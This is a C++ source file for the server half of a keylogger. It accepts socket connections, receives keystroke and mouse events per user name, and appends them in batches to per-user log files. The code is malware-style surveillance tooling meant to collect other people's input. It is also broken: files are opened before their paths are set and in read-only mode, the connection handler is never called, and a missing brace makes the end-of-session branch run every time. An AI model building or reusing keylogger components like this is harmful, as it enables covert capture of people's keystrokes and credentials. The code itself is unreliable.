#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <string>
#include <iostream>
#include "common.h"
#include <sys/wait.h>
#include <time.h>
#include "async_write.h"
#include <fcntl.h>

class KeyLogServer {
    int _listening_socket;
    std::vector <std::string> keys;
    std::vector <std::string> mice;
    std::string path_of_keyboard;
    std::string path_of_mouse;
    void action(int sock_fd, pid_t pid) {
        message msg;
        message_header msg_header;
        msg_header.action = actions::START;
        std::cout << "Starting work : " << pid << std::endl << std::endl;
        if (!try_recv_header(sock_fd, msg_header))
            exit(EXIT_FAILURE);     
        
        if (!try_recv(sock_fd, msg, msg_header.size))
            exit(EXIT_FAILURE);
        auto fd_async_keyboard = open(path_of_keyboard.c_str(), O_APPEND | O_RDONLY, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH);

        auto fd_async_mouse = open(path_of_mouse.c_str(), O_APPEND | O_RDONLY, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH);
        path_of_keyboard = msg.user_name + "_keyboard.txt";
        path_of_mouse = msg.user_name + "_mouse.txt";
        while (msg_header.action != END) {
            if (!try_recv_header(sock_fd, msg_header))
                exit(EXIT_FAILURE);
            if(!try_recv(sock_fd, msg, msg_header.size))
                exit(EXIT_FAILURE);

            if (msg_header.action == actions::MOUSE) {
                mice.push_back(msg.mice);
            }
            if (mice.size() == 50) {
                write_vector_async_file(mice, fd_async_mouse);
                mice.clear();
            }

            if (msg_header.action == actions::KEYBOARD) {
                keys.push_back(msg.keys);
            }

            if (keys.size() == 50)
            {
                write_vector_async_file(keys, fd_async_keyboard);
                keys.clear();
            }
            else if (msg_header.action == actions::END)
                write_vector_async_file(keys, fd_async_keyboard);
                write_vector_async_file(mice, fd_async_mouse);
                keys.clear();
                mice.clear();
                exit(EXIT_SUCCESS);
        }
    }

public:

    KeyLogServer(unsigned short port) {
        _listening_socket = socket(AF_INET, SOCK_STREAM, 0);
        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons( port);
        addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        bind(_listening_socket, (sockaddr*)&addr, sizeof(addr));
    }

    void start() {
        listen(_listening_socket, 2);
        sockaddr_in addr;
        socklen_t len;
        pid_t serv = getpid();
        std::cout << "Server started work!" << std::endl;
        while (true) {
            int sock_fd = accept(_listening_socket, (sockaddr*)&addr, &len);
            std::cout << "Connected from " << inet_ntoa(addr.sin_addr) << std::endl;
        }

    }
};

int main() {
    KeyLogServer gs(PORT);
    gs.start();
}